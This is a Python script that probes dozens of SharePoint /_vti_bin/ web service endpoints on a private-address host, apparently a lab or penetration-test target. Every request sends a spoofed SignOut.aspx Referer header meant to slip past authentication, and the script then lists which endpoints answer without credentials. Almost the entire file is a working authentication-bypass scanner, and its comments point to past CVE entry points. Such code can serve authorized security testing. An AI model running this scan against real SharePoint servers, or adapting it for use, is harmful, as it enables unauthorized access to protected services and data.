#!/usr/bin/env python3
# Purpose: Comprehensive test of ALL /_vti_bin/ endpoints with SignOut Referer
# Outcome: Find additional bypassed web service endpoints

import requests

target = "http://10.10.10.166"

# Comprehensive list of /_vti_bin/ web services from SharePoint
vtibin_endpoints = [
    # Already tested and confirmed bypassed
    "/_vti_bin/WebPartPages.asmx",
    
    # Core SharePoint web services
    "/_vti_bin/Lists.asmx",
    "/_vti_bin/Webs.asmx",
    "/_vti_bin/Sites.asmx",
    "/_vti_bin/Views.asmx",
    "/_vti_bin/UserGroup.asmx",
    "/_vti_bin/Permissions.asmx",
    "/_vti_bin/Authentication.asmx",
    "/_vti_bin/Copy.asmx",
    "/_vti_bin/Versions.asmx",
    "/_vti_bin/Forms.asmx",
    "/_vti_bin/Imaging.asmx",
    "/_vti_bin/Meetings.asmx",
    "/_vti_bin/People.asmx",
    "/_vti_bin/SiteData.asmx",
    "/_vti_bin/Search.asmx",
    "/_vti_bin/AdminCmdHandler.asmx",
    
    # Excel Services
    "/_vti_bin/ExcelService.asmx",
    "/_vti_bin/ExcelRest.aspx",
    
    # Business Data Catalog / BDC
    "/_vti_bin/BusinessDataCatalog.asmx",
    
    # Historical CVE entry points
    "/_vti_bin/client.svc",  # CVE-2023-24955
    "/_vti_bin/client.svc/ProcessQuery",
    "/_vti_bin/DelveApi.ashx",  # CVE-2024-38094
    
    # Publishing and content management
    "/_vti_bin/PublishedLinksService.asmx",
    "/_vti_bin/OfficialFile.asmx",
    "/_vti_bin/SpellChecker.asmx",
    
    # Taxonomy and metadata
    "/_vti_bin/TaxonomyClientService.asmx",
    "/_vti_bin/MetadataWebService.asmx",
    
    # Social and user profiles
    "/_vti_bin/SocialDataService.asmx",
    "/_vti_bin/UserProfileService.asmx",
    
    # Workflow
    "/_vti_bin/Workflow.asmx",
    
    # SharePoint Designer
    "/_vti_bin/owssvr.dll",
    "/_vti_bin/_vti_aut/author.dll",
    
    # Cell storage (Excel/Office)
    "/_vti_bin/cellstorage.svc",
    "/_vti_bin/cobalt.ashx",
    
    # Web part related
    "/_vti_bin/WebPartPages.asmx",
    "/_vti_bin/WebPartPagesWebService.asmx",
    
    # Chart web part
    "/_vti_bin/ChartWebPart.asmx",
    
    # App management
    "/_vti_bin/AppLauncher.svc",
    "/_vti_bin/SP.OAuth.asmx",
    
    # Diagnostics and admin
    "/_vti_bin/Diagnostics.asmx",
    "/_vti_bin/dspsts.asmx",
]

# Remove duplicates
vtibin_endpoints = list(set(vtibin_endpoints))

print(f"Testing {len(vtibin_endpoints)} /_vti_bin/ endpoints with SignOut Referer bypass")
print("="*80)

bypassed = []
blocked = []
errors = []
not_found = []

for endpoint in sorted(vtibin_endpoints):
    url = f"{target}{endpoint}"
    headers = {"Referer": "/_layouts/SignOut.aspx"}
    
    try:
        response = requests.get(url, headers=headers, allow_redirects=False, timeout=5)
        
        if response.status_code == 200:
            bypassed.append(endpoint)
            status_icon = "✅"
        elif response.status_code == 401:
            blocked.append(endpoint)
            status_icon = "🔒"
        elif response.status_code == 403:
            blocked.append(endpoint)
            status_icon = "🔒"
        elif response.status_code == 404:
            not_found.append(endpoint)
            status_icon = "❌"
        elif response.status_code == 500:
            errors.append(endpoint)
            status_icon = "⚠️"
        else:
            status_icon = f"❓({response.status_code})"
        
        print(f"{status_icon} {endpoint}")
        
    except Exception as e:
        print(f"💥 {endpoint} - {str(e)[:30]}")

print("\n" + "="*80)
print(f"\n✅ BYPASSED /_vti_bin/ ENDPOINTS ({len(bypassed)}):")
for ep in sorted(bypassed):
    print(f"  - {ep}")

print(f"\n⚠️  ERROR ENDPOINTS ({len(errors)}):")
for ep in sorted(errors):
    print(f"  - {ep}")

print(f"\n🔒 BLOCKED: {len(blocked)}")
print(f"❌ NOT FOUND: {len(not_found)}")

print("\n" + "="*80)
print("SUMMARY:")
print(f"  Total tested: {len(vtibin_endpoints)}")
print(f"  Bypassed: {len(bypassed)}")
print(f"  Blocked: {len(blocked)}")
print(f"  Errors: {len(errors)}")
print(f"  Not Found: {len(not_found)}")
